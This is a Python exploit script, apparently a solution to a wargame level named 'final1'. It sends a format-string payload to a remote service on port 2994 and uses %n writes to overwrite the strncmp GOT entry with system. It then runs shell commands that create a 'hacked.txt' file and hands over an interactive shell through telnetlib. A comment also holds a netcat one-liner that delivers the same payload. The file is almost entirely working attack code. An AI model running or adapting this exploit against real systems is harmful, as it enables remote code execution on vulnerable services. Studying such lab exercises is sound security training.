'''
Attempt 1: Uses the LiveOverflow style of exploit (ret2libc + telnetlib to get interactive shell on remote)
'''


import struct
import argparse
import sys
import os
import socket
import telnetlib
import struct
socketObject = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
socketObject.connect((sys.argv[1],2994))
print("Connected")


def read_explf_final1(bufexp):
   buf1 = ""
   while bufexp not in buf1:
      buf1 += socketObject.recv(1)
   return buf1

#resp=socketObject.recv(1024)
#print(resp)
#resp=socketObject.recv(4)
#resp=""
#print "CLIENT: >",resp
#Address of strncmp (global offset table to) aka address to be overwritten
#\0804a1a8
#addr_overwrite=""\xa8\xa1\x04\x08"


#address of system (no of characters printed are written to the address_overwrite)
#0xb7ecffb0
#We need to write these many bytes to perform %n properly
#Since it is a large value we will perform 2 writes
addr_strncmp_offset=0x0804a1a8
#python -c 'print "username AAABBBB\xa8\xa1\x04\x08\xaa\xa1\x04\x08\n" + "login " + "%17$65386x" + " %18$n" + "%47174x"+"%19$n"+"\n"' | nc 192.168.168.135 2994
#addr_overwrite=""\xa8\xa1\x04\x08"
addr_pack=struct.pack("I",addr_strncmp_offset)
#'\xaa\xa1\x04\x08'
addr_pack_offset2=struct.pack("I",addr_strncmp_offset+2)




buf=""
#refer nots on format string characters
buf+="username AAABBBB\xa8\xa1\x04\x08\xaa\xa1\x04\x08" + "%65403x" + " %18$n" + "%47164x"+ "%19$n"+"\n"+"login helloworld\n" +"touch hacked.txt\n"+"echo \"hello world\" > hacked.txt"
read_explf_final1("[final1] $ ")
socketObject.send(buf+"\n")
read_explf_final1("[final1] $ ")


t = telnetlib.Telnet()
t.sock = socketObject
t.interact()

socketObject.close()
